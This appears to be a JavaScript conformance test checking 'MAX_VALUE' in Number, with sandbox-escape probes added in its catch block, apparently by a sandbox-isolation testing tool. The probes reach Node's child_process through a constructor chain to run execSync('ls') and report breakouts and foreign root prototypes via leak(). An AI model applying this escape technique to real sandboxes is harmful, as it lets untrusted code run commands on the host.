try {
    if ('MAX_VALUE' in Number !== true) {
        $ERROR('#1: "MAX_VALUE" in Number === true');
    }
    var x = 'MAX_VALUE';
    if (x in Number !== true) {
        $ERROR('#2: var x = "MAX_VALUE"; x in Number === true');
    }
    var y = Number;
    if ('MAX_VALUE' in y !== true) {
        $ERROR('#3: var y = Number; "MAX_VALUE" in y === true');
    }
    var x = 'MAX_VALUE';
    var y = Number;
    if (x in y !== true) {
        $ERROR('#4: var x = "MAX_VALUE"; var y = Number; x in y === true');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}